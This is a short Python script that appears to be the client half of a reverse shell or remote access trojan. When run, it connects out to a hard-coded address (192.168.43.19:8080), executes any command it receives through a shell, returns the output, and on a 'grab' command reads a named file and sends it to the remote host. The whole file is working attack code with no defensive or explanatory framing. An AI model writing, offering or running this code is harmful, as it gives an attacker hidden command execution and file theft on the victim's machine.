#Import Packages
import socket
import os,subprocess

# For transfering of file
def transfer(s,cont):
    
    if os.path.exists(cont):
        f= open(cont,'rb')
        pac=f.read(2048)
        
        while len(pac)>=10:
            s.send(pac)
            pac=f.read(1024)
            
        f.close()
        s.send('done'.encode('utf-8'))
        
    else:
        s.send("Unable".encode('utf-8'))
        
# Connection between server and client 

def connect():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.43.19',8080))

    while True:
        cmd=s.recv(1024).decode('utf-8')
        if 'terminate' in cmd:
            s.close()
            break
        
        elif 'grab' in cmd:
            grab,cont=cmd.split('*')
            try:
                transfer(s,cont)
            except Exception as e:
                s.send(str(e).encode('utf-8'))
                pass
            
        else:
            CMD=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

def main():
    connect()
main()
    
